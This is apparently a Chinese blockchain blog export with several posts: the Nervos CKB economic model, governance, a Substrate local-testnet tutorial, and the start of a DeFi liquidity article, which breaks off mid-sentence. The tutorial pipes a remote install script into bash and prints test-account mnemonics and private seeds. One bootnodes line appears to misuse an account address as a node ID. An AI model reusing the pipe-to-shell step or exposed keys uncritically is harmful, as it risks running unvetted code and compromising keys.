合约必须根据其状态占用的大小来定期支付费用。如果没有支付租金，合同将会进入「休眠状态」，并且在支付租金之前无法访问。可以看出，这种方案也有几个难以解决的问题： 许多合约，特别是流行的 ERC20 合约，代表了去中心化的社区，并代表了许多用户的资产所有权。协调所有用户以公平并且有效率的方式支付租金是一个很难的问题。 即使一个合约的租金是已支付的状态，它仍然可能无法运作顺利，因为其他需要调用的合约可能会拖欠租金。 使用状态租赁合约的用户体验并不理想。 我们认为，一个精心设计的状态存储机制必须能够实现以下目标： 必须限制全局状态的增长，以便为参与全节点提供可预测性。理想情况下，成本能控制在非专业参与者可以负担的范围内，以保持网络最大程度的去中心化与抗审查。 随着全局状态的有限增长，价格的上升与降低将由市场决定。特别是当状态存储空间快满的时后，需要将状态存储的成本提高，而当它大部分为空时，需要降低成本，这是非常吸引人的。 系统需要能够不断收取其状态用户的租金，以支付矿工提供这种资源。这有助于平衡矿工的经济收入，同时激励用户尽早清除不必要的状态。 就像比特币如何限制带宽，以及以太坊限制计算的定价，来保持区块链网络长期去中心化和可持续，我们必须提出一种对于全局状态的约束与定价方法。对于以保护资产为重点的「资产存储」平台来说，这是特别重要的，因为这种平台关心的不是大部分将发生在链下的交易，而是持续占用全局状态的存储成本。 Nervos CKB 的经济模型Nervos Common Knowledge Base（简称 Nervos CKB）是一个以保存价值为重点的「资产存储」区块链。在架构上，是为了要最好地支持链上的状态和链外计算。在经济上，是为了要提供可持续的安全性和去中心化。 Nervos CKB 是整个网络的基础层。 原生代币Nervos CKB 的原生代币是 「Common Knowledge Byte」，简称「CK Byte」。 CK Byte 代表 Cell 空间，它们让拥有者能够占用区块链的全局状态。例如，如果 Alice 拥有 1000 个 CK Bytes，她可以创建一个空间为 1000 Bytes 的 Cell，或者空间合计最多为 1000 Bytes 的多个 Cell。她可以使用 1000 个 Bytes 来存储资产、应用程序状态或是其他类型的数据资料。 一个 Cell 中已占用的空间可以等于或者小于这个空间被指定的大小。比如说，一个空间为 1000 Bytes 的 Cell，4个 Bytes 用于表示它所能使用的容量，64个 Bytes 用于锁定脚本，128个 Bytes 用于存储状态。也就是说，这个 Cell 目前已被占用的容量是196个 Bytes ，但它还有足够的空间，最多可以使用到1000个 Bytes。 代币发行政策有两种类型的原生代币发行政策。 「基础发行」的总供给量有限，发行时间表与比特币类似 - 基础发行数量大约每 4 年减半一次，直到所有「基础发行」的代币被挖出来。所有「基础发行」代币都会奖励给矿工，作为保护网络的激励措施。 「二级发行」的设计则是为了收取状态租金，每年的发行数量是不变的。「基础发行」停止后，「二级发行」仍会继续。 收取二级发行的状态租金和 NervosDAO 设计由于原生代币代表了占用全局状态的权利，所以代币发行政策会限制状态的增长。由于状态存储受限制并且成为了稀缺资源，就好比比特币的带宽和以太坊的计算吞吐量，它们可以在市场上被定价和交易。状态租金在状态占用的费用结构上，增加了必要的时间维度。我们采用两个步骤作为「目标通胀」框架来收取这笔租金，而不是强制定期收取租金： 在「基础发行」的基础上，我们添加了「二级发行」，可以将其视为对所有代币持有者的「通胀税」。对于使用CK Byte 存储状态的用户，这种定期的通胀税是他们向矿工支付状态租金的方式。 然而，由于我们对于那些没有使用 CK Byte 存储状态的所有者也收取了租金，所以我们需要将租金归还。我们允许这些用户将他们的原生代币存入并锁定到一个特殊合约中，我们称它为 NervosDAO。 NervosDAO 将接受部分「二级发行」的补偿，以弥补因为不公平造成的稀释。 假设在「二级发行」时，所有 CK Byte 的 60％ 用于存储状态，所有 CK Byte 的 35％ 被存放并锁定在 NervosDAO 的合约中，剩下的 CK Byte 中的 5％ 保持流动性。那每次进行「二级发行」出块奖励的时候，60％ 的「二级发行」会奖励给矿工，35％ 的会进入 NervosDAO 按比例分配给锁定的代币（用户），最后剩下的 5％ 既没有占用也没有锁币的部分，将交由社群订定的治理机制处理；在社群未达到机制的共识之前，这部分的「二级发行」将会烧毁。 对于长期代币的持有者，只要他们将代币锁定在 NervosDAO 合约中，「二级发行」的通胀效应只是名义上的。对他们而言，就像「二级发行」不存在一样，他们持有的代币，就会像比特币这样有硬顶的设计。 矿工补偿矿工会获得两种出块奖励和交易手续费。他们将会收到所有的「基础发行」，以及部分的「二级发行」。长期来看，当「基础发行」停止后，矿工仍然可以获得状态租赁的收入。 交易手续费支付去中心化区块链网络的交易吞吐量是有限的，其资源是受到限制的。交易手续费有两个目的，一个是为了有限的交易吞吐量建立一个市场，另一个则是防止恶意大量攻击。在比特币中，交易手续费表现在输出和输入之间的差异，而在以太坊中，处理交易需要矿工执行无法有效估算的计算，因此交易手续费表现为计算的单位成本或「gas price」。以太坊交易包括 gas price 和 gas limit 的属性，实际交易费用是 gasPrice 乘以使用的 gas 量，但不会超过上限的 gasLimit。 为了确保去中心化，Nervos CKB 限制了计算和带宽的吞吐量，当用户要使用这些系统资源时，它可以有效地成为一个拍卖市场。当用户提交交易时，提交的总输入需超过总输出的 Cell，将其差值作为以原生代币来支付的交易费用，支付给打包交易的出块矿工。 计算的单位数量（计算循环数）也需要作为交易的一部分来提交。 Nervos CKB 是一种「链下计算，链上验证」的平台，因此提交交易的客户端知道计算循环数。在出块时，矿工根据交易费用和交易验证所需的计算循环来排序每笔交易，以在有限的计算和带宽吞吐量下，最大化每一个计算循环数的收入。 在 Nervos CKB 中，手续费的支付可以透过原生代币、「用户自定义代币」，或是两者结合使用。 使用「用户自定义代币 UDT」支付交易手续费用户还可以自由地发行其他代币，例如稳定币，用来支付交易费用，这个概念是一种「经济抽象」。即使没有明确的协议支持，用户总是可以与矿工自行安排使用在协议之外的代币支付交易手续费。这通常被许多平台视为一种威胁 - 如果平台的原生代币纯粹是为了促进交易，这将剥夺其系统的内在价值，并进一步导致崩溃。 通过 Nervos CKB，我们拥抱经济抽象以及其带来的好处。由于原生代币的内在价值不是基于支付手续费的，因此经济抽象不会让我们的经济模型造成威胁。然而，我们确实希望原生代币将成为绝大多数用户和应用的首选支付方式 - 原生代币将会成为 Nervos 生态系统中最广泛持有的代币，因为每个拥有资产的人都必须拥有 Nervos 的原生代币，原生代币对应的是状态的存储空间，因为资产本身也占有了一定的存储空间。 用于保存价值的经济模型Nervos CKB 的经济模型专门设计用于保存资产以及各种类型通用知识数据的价值。让我们回顾 3 个重要的经济模型设计目标，并在此背景下检查我们的设计： 经济模型如何确保协议的安全性？ 经济模式如何确保协议的长期可持续性？ 经济模型如何让不同参与者拥有共同的目标，以促进整个网络的价值？ 协议的安全性和可持续性为了确保 Nervos CKB 成为「资产存储」协议，并且保障协议的安全性，我们选择的主要设计是： 我们的原生代币代表相应状态存储空间的主张权。这意味着，如果想在平台上通过状态空间持有资产，必须拥有对应状态空间的原生代币。因此，在平台上持有资产，直接创造了原生代币的需求。通过对资产的价值保存，原生代币打造出有效的价值捕获机制。正是这种机制，「资产存储」平台可以随着时间的推移持续增加安全预算，而不是基于投机和利他主义。 二级发行可以保证矿工的补偿是可预测的，并且是基于价值保存的需求，而不是交易的需求。同时，二级发行也消除如中本聪协议的共识节点在出块奖励停止后，潜在的激励矛盾问题。 对于「二级发行」造成的通胀效应，NervosDAO 提供对应的反制力量，确保代币长期持有者的代币价值不会因为「二级发行」而被稀释。 为了保持网络的去中心化和抗审查能力，我们认为降低参与共识以及成为主节点所需要的资源门槛是非常重要的。我们通过调节计算和带宽的吞吐量来保护节点的运营成本，类似于比特币和以太坊的实现方式。甚至，我们透过「总量管制」的定价框架，与基于存储用户成本模型的机会成本这两种方式的结合，进行了状态存储的管制。 让网络中每一类参与者的利益一致在传统的智能合约平台中，网络参与者有着不同的意图 - 用户希望更加低廉的交易手续费，开发者希望自己的应用可以得到广泛使用，矿工们希望获取更高额的收入，持有者希望持有的代币可以增值。每一类参与者的利益并不是完全一致的，甚至，各自的利益诉求可能发生冲突 - 例如，广泛的应用使用不可能让交易变得低廉（相反，随着区块链的使用需求增加，交易应该更加昂贵）；更加低廉的交易也不会给矿工增加收入；高涨的代币价格对于交易的成本也没有任何帮助（倘若用户不调整其本地交易费用的设置，则可能发生相反的情况）。去中心化计算平台通过处理交易提供价值，基于这类平台的代币价格并不会实质性地改变整个网络的内在价值。例如，以太币（Ether）的价格翻倍并不会增加或减少以太坊（Ethereum）作为去中心化计算平台的内在价值。假设 gasPrice 没有发生变化，用户在整个网络上面可以用同样的成本完成相同的任务。如此一来，以太坊的代币持有者仅仅扮演了投资者的角色，而不是积极的贡献者。 在 Nervos CKB 中，存储资产的用户希望其资产安全；开发者希望(其产品)得到更多地使用，并与之相应，保存更多的资产价值；矿工们希望获得更高的收入，而代币持有者希望他们的代币价格升值。更高的代币价格支撑着每个人的利益 - 网络变得更加安全，矿工得到更高额的收入，代币持有者得到更丰厚的回报。梳理齐整所有参与者的激励，将使得全网可以最好地利用网络效应来增强其内在价值。此外，这也会培养出一个更具凝聚力的社区，使得整个Nervos系统面临更少的治理挑战。 引导网络效应和网络增长随着网络的发展，更多资产和通用知识的价值得到安全地保障，相应地，更多对应存储空间的 Nervos CKB 原生代币将被占用。这样，原生代币的流通量和供应量将被减少，同时，其市场价格会获得有效地支撑，进而，CKB的价值得到增加。更高的代币价格和二级发行增加的收益份额，可以激励矿工扩大规模，并确保网络更加安全，同时，也增加整个网络和原生代币的内在价值，吸引更丰富和更高价值的资产存储使用场景。 网络对顺向循环的使用以及其内在的价值，为其本身提供了强大的增长引擎。随着网络通过各种方式积累原生代币的价值，并由长期持有者获取对应的价值，网络中的原生代币会成为价值存储的绝佳候选者。与比特币作为货币存储价值相比，Nervos CKB 同样设计为安全且长期去中心化的。我们相信 Nervos CKB 拥有比比特币更加平衡和可持续的经济模型，并且具有保护加密资产及通用知识价值的本质功能。 开发者在「一级资产」平台中的成本在以太坊中，顶层的抽象是账户。智能合约账户拥有资产所代表的状态。在 Nervos CKB 中，资产是 Cell 顶层的抽象，其所有权由交易输出的锁定脚本来表示，这个概念称为「第一级资产」。换句话说，就像比特币一样，CKB 中的资产由用户直接拥有，而不是在智能合约中被保管。 「第一级资产」的设计允许开发者可以不用拥有资产，以及负担状态存储的成本，而是由具体独立的用户承担。举例而言，开发人员使用 400 CK Bytes 的代码，创建了一个用户自定义代币的验证规则，每个资产所有权的记录都将占用 64 个字节。即使资产拥有 10,000 个所有者，开发人员仍然只需要使用 400 CK Bytes。 对于开发者而言，我们预计即使在原生代币价格上升幅度较大的情况下，在 CKB 上构建项目的成本也是适中的。对于用户来说，即使平台在被大幅度采用的假设下，64 CK Bytes 在 Nervos CKB 上的拥有成本也很低。 在未来这些开发成本或拥有成本变得非常昂贵的情况下，开发者仍然可以依靠租赁来启动他们的项目，用户可以在愿意采取取舍的情况下，将 CKB 上面的资产转移到 Nervos Network 中的其他交易型区块链。相关信息请参考「7.6 Nervos Network」部分。 租赁实际上 Nervos CKB 也将支持原生代币的租赁，以改善 CK Bytes 的流动性，这归功于 CKB-VM 和 Cell 模型提供的编程能力。由于原生代币的功能是通过空间占用而不是交易来实现的，因此，可以在已知的一定时间内锁定 CK Bytes 进行无风险的无担保借贷。开发者可以在 6 个月这样的时间内，以较低的资金成本借入他们需要的 CK Bytes 来完成产品原型并证明他们的商业模式。长期的代币持有者也可以出租他们的代币来赚取额外收入。 租赁的实际利率由市场供求决定，但代币的占用状况也有著重要的影响。如果全局状态利用率高，代表可用于贷款的代币就更少了。这将使得租赁利率更高，在 NervosDAO 合约中释放状态，锁定代币以获得收入，变得更具吸引力。这有助于减少全局状态。而较低的全局状态利用率代表着有更多的代币可以出租。这将使得贷款利率降低以鼓励使用。 Nervos NetworkNervos CKB 是 Nervos Network 的基础层，具有最高级别的安全性，去中心化，交易成本和状态存储成本。正如比特币和以太坊可以通过 lightening network 和 plasma 方案来进行链下扩容，Nervos CKB 同样拥有链下扩容解决方案，并允许用户在链下保存和交易资产。当使用链下解决方案时，用户和开发者可以在成本、安全性、延迟和活跃度之间做出权衡。 在 Nervos CKB 上持有资产和交易资产需要最高的资本和交易成本，但这也是最安全的。这最适合于高价值资产和长期资产的存储用途。第 2 层解决方案可以为交易吞吐量和状态存储提供扩展，但它们会带有相对较弱的安全性证明，或者会要求额外的强制步骤，而且通常会要求参与者在一定的时间范围内在线。如果这两者都可以接受（可能用于短期持有和交易低价值资产），Nervos CKB 可以被用作其他交易型区块链的安全之锚，以有效地放大其交易量和状态存储空间。 假如交易型区块链的系统不希望引入额外的安全性证明，它们可以要求在 CKB 上发行高价值的资产，而在交易型区块链上面发行低价值的资产。然后，他们可以在 CKB 上使用 CK Bytes 来存储周期性的区块提交，带着交易型区块链的挑战和证明 - 这是链下交易安全的关键常识。如果交易型链不介意使用基于委员会的共识协议，引入额外的安全性证明层，他们也可以让他们的验证节点在 CKB 上绑定 CK Bytes 以明确地调整安全性的参数。 代币经济学的应用Nervos CKB 的经济模型提供 App 开发者可以直接使用的构建模块，作为开发者特有经济模型的一部分。下面，我们列举订阅模型和流动性收入模型两个可能的构建模块。 Subscriptions 订阅模型 在很长时间内，定期性支付或订阅是区块链提供服务的典型经济模型。相关的例子如，第 2 层解决方案经常需要的链下交易监控服务。基于 Nervos CKB 的订阅模型，一定时间内服务的提供商可以要求其用户在 NervosDAO 中锁定一定数量的原生代币，并将服务提供商指定为 NervosDAO 生成的利息收入受益者。再者，通过从 NervosDAO 撤回代币，用户也可以停止使用相应的服务。 实际上，占用全局状态的资产存储用户可以视为根据其状态的存储规模，支付持续订阅的费用，当然，受益人是提供安全服务的矿工。 Liquidity Income 流动性收入模型 在类似于 Plasma 的第 2 层解决方案中，典型的模式是用户在第 1 层区块链的智能合约中抵押原生代币，换取第 2 层上的交易代币。对于信誉足够的第 2 层运营商，他们可以接受用户提交的固定时限内的资产抵押，然后使用这些抵押的资产进行贷款，为借贷市场提供流动性和赚取收入。这样，第 2 层解决方案的运营商除了在第 2 层收取的费用之外，也拥有额外的收入方式。 深入浅出区块链技术博客-系统学习区块链，学区块链的都在这里。]]></content>
      <categories>
        <category>Nervos</category>
      </categories>
      <tags>
        <tag>Nervos</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[谈谈区块链（去中心化）治理]]></title>
    <url>%2F2019%2F06%2F01%2Fgovern%2F</url>
    <content type="text"><![CDATA[治理，这个词在英语系国家用的很多，国内使用比较少，原意是控制、引导和操纵，指的是在特定范围内行使权威。如何在众多不同利益共同发挥作用的领域建立一致或取得认同，以便实施某项计划。 区块链治理区块链是去中心化的，那么如何协调众多的利益方来进行区块链平台的改进，这就是区块链治理，即治理让区块链进化。改进通常包括：采用何种方案修复已知问题，加入哪些新的特性，甚至是如何管理社区资金。利益方通常包括：持币者（用户）、矿工（或者验证人）、核心开发者、项目基金会。 区块链信任来源就是相互制衡下共同遵守规格，同时这种制衡也给治理带来了困难。 区块链治理演进链下（社区）治理以比特币为例，治理过程大概是：社区广泛讨论 -&gt; 形成BIP（比特币改进提案）-&gt; 开发人员实现 -&gt; 矿工上线。 矿工选择什么样的BIP部署上线进而修改协议是最为关键的一步，而又难以达成一致因此有旷日持久的大区块vs.隔离见证的争议，最终共识分裂，形成分叉。 以太坊的治理过程与比特币类似，不过V神的巨大影响力以及以太坊一开始就有比较明确的发展路线图（代码中提前内置了对一些升级的准备），使得以太坊治理更容易达成共识（尤其是V神支持的某些改进）。 不过即便如此也因为DAO事件发生分叉。 链下治理的缺陷非常明显，就是很容易陷入争议，导致分支（有时即便达成了共识，效率也非常低）。 链上治理针对分叉治理的缺陷， 逐渐有项目开始探索链上治理，持币者通过对进行投票表决，表决通过的提案才能部署上线。Decred最早实施了链上治理，在实际运行过程也遇到普通用户参与投票意愿很低，一些PoS链则通过 Staking 的方式和治理绑定，日常的治理有选出的验证人来进行，重大议题依然可以有持币者公决。 链上治理相对于链下（社区）治理有不小的进步，如何进行更好的链上治理，仍然是业界探索的方向之一。 参考文章：http://123net.cn/2019/05/29/跨链释放-dapp-创新潜能/ 深入浅出区块链-系统学习区块链，学区块链的都在这里，打造最好的区块链技术博客。]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>治理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Substrate搭建一条能跨链的区块链]]></title>
    <url>%2F2019%2F05%2F30%2Fcreate-chain-on-substrate%2F</url>
    <content type="text"><![CDATA[Substrate 是Polkadot项目推出的区块链构建框架。通过使用Substrate，使普通的软件开发人员可以在短时间内建立一条属于自己的完整区块链，开发者只需要关注自己的业务逻辑，从底层复杂的技术中解放出来。 为什么使用区块链比特币网络作为最早的区块链网络，已经存在了十年时间。在今天，区块链技术还没有像互联网那样深刻地改变着我们每个人的生活，但是它的优势已经在一些行业和领域展现出来，比如国际支付、金融衍生品交易、预测市场、去中心化自治组织等。 区块链或者更准确的说是去中心账本，相对于传统互联网行业有其天生的优势，比如： 永不离线 - 安全的公有链又全球数以万计的计算机节点共同维护，理论上讲只要还有一个节点可供访问，数据就不会丢失。 开源审查 - 绝大部分区块链应用的代码都是开源的，供全世界的开发人员审查，除了能够提升代码质量，开源运动更为深远的意义在于通过分享促进着人类社会的进步。 数据加密 - 密码学技术是去中心账本的基石，保证数据不被篡改，让数据更加安全。 保护隐私 - 每一个用户都是链上的一个账户，而账户的所有信息完全由掌握账户所对应私钥的用户控制着，除非用户自己公开或者交易数据，否则数据不会泄露。 分享权益 - 用户可以通过参与到区块链的安全运转机制中，获取到原本只有中心化的企业才能拿到的权益。 随着区块链技术的不断演进，交易成本、确认时间、能源消耗、安全性、互通性都得到了极大地提升，传统互联网企业在相同的产业领域将面临着具有以上所说优势的区块链企业的挑战。 现在处在优势地位的传统互联网”独角兽”，如果依靠区块链技术成功转型，能够确保在未来不会被轻易淘汰； 处于劣势地位的小企业或者小团队，通过在链上实现业务，可以达到”四两拨千斤”的竞争优势。 然而区块链的开发依赖多学科的知识技能，比如密码学、高效点对点网络、软件工程、经济学模型等等，小团队甚至是大企业都很难具备这样的人才资源，对于”上链”大多数人都是心有余而力不足。Substrate的出现就是为了解决这个问题。 什么是SubstrateSubstrate是由德国Parity公司推出的一个区块链构建框架。它实现了区块链开发领域中所遇到的大部分通用功能，比如点对点网络连接，可配置的共识算法，常用加密算法，数据库存储，交易管理等。通过使用Substrate，使普通的软件开发人员可以在短时间内建立一条属于自己的完整区块链，开发者只需要关注自己的业务逻辑，从底层复杂的技术中解放出来。 使用Substrate构建的区块链，有一个额外的好处，就是可以轻易地连接到Parity的Polkadot公链网络，这一网络具有很多优势，比如跨链交易、共享安全等。 Substrate是由Rust语言开发，而Rust最为一门高级静态编程语言，具有诸多优势，如内存安全、类型检查、支持编译为WASM、函数式友好、社区资料完善等优点。通过借助Rust的优良特性，也使得Substrate的性能优良、可读性高。 你也可以参考Substrate官方参考文档来了解更多。 下面，进入今天我们的主要任务，使用Substrate来构建一条本地的测试区块链网络。 搭建区块链通过这一节，你会学到： 如何创建和编译节点程序 如何启动节点程序及各项参数配置 不同的节点网络有什么区别 如何修改chainspec文件 准备环境 Mac OS 或者Linux计算机 Git 创建和编译节点程序方式一 安装依赖工具，如Rust环境、openssl、cmake、 llvm库： 1curl https://getsubstrate.io -sSf | bash 如果感兴趣上面脚本的具体执行内容，可以参考这里。由于国内网络原因，以上脚本可能会下载失败或者过慢，参考下面的方法配置国内的Rust仓库镜像进行下载。 1234567git clone https://github.com/kaichaosun/getsubstrate-cncd substrate-cncp config ~/.cargo/config./getsubstrate 新建节点程序，使用命令行导航至你想要放置节点程序的目录，执行： 1substrate-node-new substrate-demo-node someone 你也可以替换substrate-demo-node为你想要的节点程序名，替换someone为你自己的名字。等待命令执行完后，一个属于自己的节点程序就完成了。 注：substrate-node-new命令会帮你拷贝substrate模板节点程序、初始化WASM的构建环境、编译Rust代码为WASM等，具体内容参考链接。 如果发生了代码改动，就需要重新编译。 首先，编译Rust代码为WASM： 1./build.sh 之后，编译生成可执行程序： 1cargo build --release 可执行程序被放为target/release/template-node。 方式二另外一种创建节点的方式是通过拷贝substrate的Git源码，编译node-template： 12345678910111213141516git clone https://github.com/paritytech/substrategit checkout -b v1.0cd substratecd node-template# 初始化WASM的构建环境./scripts/init.sh# 编译Rust代码为WASM./scripts/build.sh# 生成可执行程序cargo build --release 这种方式适合对substrate源码有一定了解的人，如果是初学者，建议用上面第一种方式。 本地开发网络首先清空节点数据库： 1./target/release/template-node purge-chain --dev 然后启动节点程序： 1./target/release/template-node --dev --dev表示我们准备启动一个本地开发链，会自动初始化开发环境所需的数据和配置。 如果出现了类似下图所示地内容，那恭喜你成功创建了一条本地开发链。 现在你可以访问https://substrate-ui.parity.io，选择Settings，将remote node设置为Local Node (127.0.0.1:9944)，如下图所示： 选择Explorer，就能够看到最新的区块在不断产生。 下面，我们来发送一笔交易，选择Extrinsics，submit the following extrinsic选择为balances transfer(dest, value)，dest: Address选择为BOB，value: Compact&lt;Balance&gt;设置为你想转账的金额，之后点击Submit Transaction，几秒钟之后会弹出交易成功的提示，这个时候你可以看到Alice的金额减少了，当切换using the selected account为Bob之后，可以看到他的金额增加。 接下来请你要独立地尝试这个页面上的不同功能，不用担心把辛苦搭建的链玩坏，这也是Substrate的一个好处，可以快速清理垃圾数据。 本地多节点测试网络这里我们使用本地测试网络内置的账户，首先启动Alice节点： 12345678./target/release/template-node \ --base-path /tmp/alice \ --chain=local \ --key //Alice \ --port 30333 \ --telemetry-url ws://telemetry.polkadot.io:1024 \ --validator \ --name AlicesNode 命令行参数的涵义如下： --base-path /tmp/alice：节点数据所存储的位置 --chain=local：指定了节点所处的网络类型，这里local表示本地测试网络，dev表示本地开发，staging表示公开测试网络 --key //Alice：模块节点程序启动时需要私钥，这里我们用了预置的Alice用户私钥 --port 30333：指定p2p协议的TCP端口 --telemetry-url ws://telemetry.polkadot.io:1024：将节点的监控数据发送到指定的监控服务器 --validator：启用validator模式，参与区块生产 --name AlicesNode：指定节点名 命令执行之后，应该能看到以下启动信息： 打开一个新的命令行窗口，启动Bob节点： 123456789./target/release/template-node \ --base-path /tmp/bob \ --chain=local \ --key //Bob \ --port 30334 \ --telemetry-url ws://telemetry.polkadot.io:1024 \ --validator \ --name BobsNode \ --bootnodes /ip4/127.0.0.1/tcp/30333/p2p/QmRhEhiX8QHVW87wKCTp3qKyY1X21ycKXKdDBrqSR74NWx 这里，我们为Bob节点指定了不同的数据存储路径、p2p端口等，--bootnodes指明了依赖的启动节点信息，这里使用了Alice节点作为启动节点，30333为Alice节点的端口，QmRhEhiX8QHVW87wKCTp3qKyY1X21ycKXKdDBrqSR74NWx为Alice的节点ID。 如果一切正常，你应该能够看到： 1Idle (1 peers), best: #2 (0x5155…5b72), finalized #0 (0x146f…317f), ⬇ 24 B/s ⬆ 0.1kiB/s 表示Bob节点连接到Alice节点上了(1 peers)，并且新产生的区块没有最终确定finalized #0 (0x146f…317f)，这是因为模块节点程序没有最终确定性这一功能，想要了解更多，请查看官方文档或者留意我的后续文章。 然后，和之前的方式相同，在浏览器访问区块的信息。 使用新账户启动本地测试网络生成新账户 如果我们不想用预置的Alice和Bob账户启动网络，就需要执行subkey -e generate命令生成新账户，生成的内容包含私钥seed，公钥public key和交易地址Address： 账户1： 1234Phrase `gas ride shoe victory oil young music trend kingdom rookie south harbor` is account: Seed: 0x9aaae371d50d1109fee8595398e54a86f6c79b116ba1894e8207f503708f7d0f Public key (hex): 0xcc706bd768a54054ac70b3f5568d0103e0f70a2f878e37949e125dd7456ee180 Address (SS58): 5Ggm2DMCG1LRcXUjGE6toVmyHKVSNutzSbUrvQv5gbr5BC6S 账户2： 1234Phrase `real during evidence worry mountain plastic depth desert actress infant age pill` is account: Seed: 0x16208851b59f7c6a383a70342fa0893169c7c3190c543d44bd42833f61e54a56 Public key (hex): 0xd6147f4bbb0eeb925e61b31fbed45ab1e3c45fed8d36ce4161c99956dfdf8f9b Address (SS58): 5GuQCAzXM5xcJfEinUgWnB7PFn2ZGhQfAKAdGRhacRHsXWE9 将生成的内容安全地保存起来，通过分享地址给其它节点，实现p2p的连接。 注：如果没有subkey命令，需要到substrate源码目录下重新编译生成cargo install --force --path subkey subkey。 构造chainspec文件 Substrate区块链的初始启动信息在chainspec的json文件中维护着，首先生成一个local测试网络的chainspec: 1./target/release/template-node build-spec --chain=local &gt; localspec.json 编辑localspec.json，修改authorities为新生成用户的地址，其它不用修改： 1234567"consensus": &#123; "authorities": [ "5Ggm2DMCG1LRcXUjGE6toVmyHKVSNutzSbUrvQv5gbr5BC6S", "5GuQCAzXM5xcJfEinUgWnB7PFn2ZGhQfAKAdGRhacRHsXWE9" ], "code": "0x0061736d01000000018b011660027..."&#125; 修改完后，转换chainspec为原始格式，区别是原始格式的chainspec中所有的字段名都用十六进制进行了编码： 1./target/release/template-node build-spec --chain localspec.json --raw &gt; customspec.json 启动节点 启动账户1的节点： 12345678./target/release/template-node \ --base-path /tmp/account1 \ --chain ./customspec.json \ --key 0x9aaae371d50d1109fee8595398e54a86f6c79b116ba1894e8207f503708f7d0f \ --port 30333 \ --telemetry-url ws://telemetry.polkadot.io:1024 \ --validator \ --name Account1Node 这里，--chain ./customspec.json是启动区块链所需的chainspec文件。 启动账户2的几点： 123456789./target/release/template-node \ --base-path /tmp/account2 \ --chain ./customspec.json \ --key 0x16208851b59f7c6a383a70342fa0893169c7c3190c543d44bd42833f61e54a56 \ --port 30334 \ --telemetry-url ws://telemetry.polkadot.io:1024 \ --validator \ --name Account2Node \ --bootnodes /ip4/127.0.0.1/tcp/30333/p2p/5Ggm2DMCG1LRcXUjGE6toVmyHKVSNutzSbUrvQv5gbr5BC6S 这时候你已经拥有了属于自己的第一条区块链！ 总结恭喜你，完成了substrate搭建区块链的第一堂课，我们回顾一下学到的内容，包括安装substrate的依赖环境，创建和编译节点程序，启动测试网络，修改chainspec等等。社区提供了很多的资料供参考，也可以关注知乎专栏《Substrate区块链开发》。 参考资料 Start a Private Network with Substrate 本文作者孙凯超, 原文链接 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>跨链</category>
        <category>Polkadot</category>
      </categories>
      <tags>
        <tag>Substrate</tag>
        <tag>Polkadot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DeFi 的流动性模型]]></title>
    <url>%2F2019%2F05%2F28%2Fdefi-liquidity-models%2F</url>
    <content type="text"><![CDATA[DeFi （Decentralized Finance 去中心化金融）今年以来受到了越来越多的关注，本文来聊聊主流 DeFi 项目的流动型模型。本文译自DeFi Liquidity Models 流动性差异随着开放金融协议的潜力变得越来越清晰，一些应用得到采用的速度比其他应用更快。 Maker 在锁定价值和交易量方面占主导地位。Compound 和 Uniswap紧随其后，但在流动性方面远远领先于 0x、Dharma、Augur 和 dydx。 其余的还没有出现在视野内。 仔细观察这三个具有主导地位的协议，就会发现它们在流动性方面的一个设计优势: 不需要交易对手就可完成交易。 Maker 、 Compound 和 Uniswap 的成功似乎与它们所支持的业务范围没有太大关系。 从借贷的角度来看，Maker 和 Compound 并没有提供交易双方通过类似 Dharma 通过交易对手达成的贷款交易 。 通过 标量市场（scalar markets），Augur 可以提供与 Maker 类似的看涨 ETH 的杠杆式长期投资，用户还可以有更多选择。 Uniswap 的配对数量远少于许多 0x 中继商，但却获取了更高的交易量。 为什么提供更少选项的协议却获得了更多的使用呢？这可能是因为它们限制了用户可用的交易类型，从而允许“自动供应方”可以持续的提供服务。 在 Augur 上采用二元市场: 要做多 ETH，用户需要从另一个用户或做市商那里购买一个看涨ETH份额 ー 一个定制的 ERC20 代币。 或者，他们可以自己发行一套完整的看涨份额和看空份额，然后将看空份额出售给另一个用户，自己留下看涨份额直到市场结算。 这些代币在任何去中心化交易所（DEX）上都没有交易对，更不要说那些中心化交易所了。 这种长尾资产的流动性受到严重限制，使得它们的交易成本更高、更不方便。 在 Maker 中，这个过程更容易完成。 用户通过锁定 ETH 来发行 DAI。 要杠杆化做多，他们只需要将新发行的代币兑换成 ETH。这很容易做到，在任何交易所都有充足的流动性。 换句话说，Augur 将流动性分散在大量唯一的 ERC20 代币上，而 Maker 将流动性集中在单一资产 DAI 上。 Augur 是一个定制的和多样化的过程，Maker 是自动并持续的过程。 这极大地优化了成本和可用性。 三个流动性类别从流动性的角度来看 DeFi 协议，可以分为三个明显的类别: 其中一类协议 (Augur，0x，Dharma) 需要用户找到对手方进行交易； 另一类协议 (Compound，Uniswap) 将做市商的资产集中起来形成资产池，并将它们提供给交易者以获得费用； 最后一类协议 (Maker) 通过治理设定参数，允许用户直接与智能合约进行交易。 像 0x、 Augur 和 Dharma 这样的协议是真正的 P2P： 对于每个想做多的用户来说，必须找到一个交易对手来做空。 由于这些都是需要对等协商的双边交易所，这些 P2P 协议上所支持的交易类型应该是其它类别协议所支持交易类型的超集。 这里不存在全局价格，只有一系列不同价位的双边交易（我们通常可以从中看出一些隐含的全局价格指示）。这些交易对手可以相互协商的交易类型几乎没有理论上的限制。 如果拿游戏做类比，我们可以把 Uniswap 和 Compound 想象成一个大型多人在线角色扮演游戏（MMORPG）: 不是离散的双边交易，而是所有用户都在同一张地图上玩。 用户不需要去寻找交易对手，他们只需要与资产池进行交易。 这些交易的全局价格是通过算法设定的，在 Uniswap 采用恒定的乘积规则，在 Compound 采用基于利用率的利率模型。 这里的交易和市场都受到了更多的限制。 Maker 提供了一种（准）单一玩家模式，用户根据通过治理确定的参数自行发放贷款(有人可能会争辩说，用户是在与代表系统管理者的资产池进行交易)。 目前，Maker 只提供一种类型的交易，流动性集中在一个资产 DAI 上。 在 Augur 上，任何用户都可以创建对任何事件的看涨，只要他们能够找到持有相反意见的交易对手方即可。 在 Dharma 中，任何人都可以以任何条件借入任何资产，只要他们找到另一方借给他们。 在 Maker 上，人们可以下注的“赌注”数量较少，但一旦确定，就几乎不存在流动性约束——也就是说，单人玩家模式是可行的（玩法取决于在线参数）。 对 Maker 